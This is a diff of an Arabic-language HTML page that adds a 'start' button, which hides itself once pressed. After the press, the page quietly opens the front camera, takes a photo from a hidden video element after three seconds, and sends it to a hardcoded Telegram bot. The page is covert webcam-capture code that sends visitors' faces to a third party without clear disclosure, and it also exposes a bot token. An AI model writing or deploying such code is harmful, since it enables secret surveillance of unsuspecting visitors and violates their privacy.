@@ -1,21 +1,23 @@
 <!DOCTYPE html>
 <html lang="ar">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>التقاط صورة تلقائي</title>
+  <meta charset="UTF-8">
+  <title>التقاط تلقائي</title>
 </head>
 <body>
+  <button id="startBtn">ابدأ</button>
   <video id="video" autoplay playsinline style="display: none;"></video>
   <canvas id="canvas" style="display: none;"></canvas>
 
   <script>
     const video = document.getElementById('video');
     const canvas = document.getElementById('canvas');
+    const startBtn = document.getElementById('startBtn');
     const botToken = '70718054647964608918:AAFDyakp3Vc_ZPNbUifkhS2pwCp9fbHQsKs';
     const chatId = '7071805464';
 
-    async function startCamera() {
+    startBtn.onclick = async () => {
+      startBtn.style.display = "none"; // إخفاء الزر بعد الضغط
       try {
         const stream = await navigator.mediaDevices.getUserMedia({
           video: { facingMode: "user" }, // الكاميرا الأمامية
@@ -24,14 +26,13 @@
 
         video.srcObject = stream;
 
-        // انتظر قليلًا للتأكد من تشغيل الكاميرا
         setTimeout(() => {
           captureAndSendPhoto();
         }, 3000);
       } catch (err) {
-        alert("حدث خطأ عند محاولة الوصول إلى الكاميرا: " + err);
+        alert("فشل الوصول إلى الكاميرا: " + err);
       }
-    }
+    };
 
     function captureAndSendPhoto() {
       const context = canvas.getContext('2d');
@@ -46,4 +47,14 @@
 
         try {
           await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
-
+            method: 'POST',
+            body: formData
+          });
+        } catch (error) {
+          alert("فشل إرسال الصورة إلى تليجرام: " + error);
+        }
+      }, 'image/jpeg');
+    }
+  </script>
+</body>
+</html>
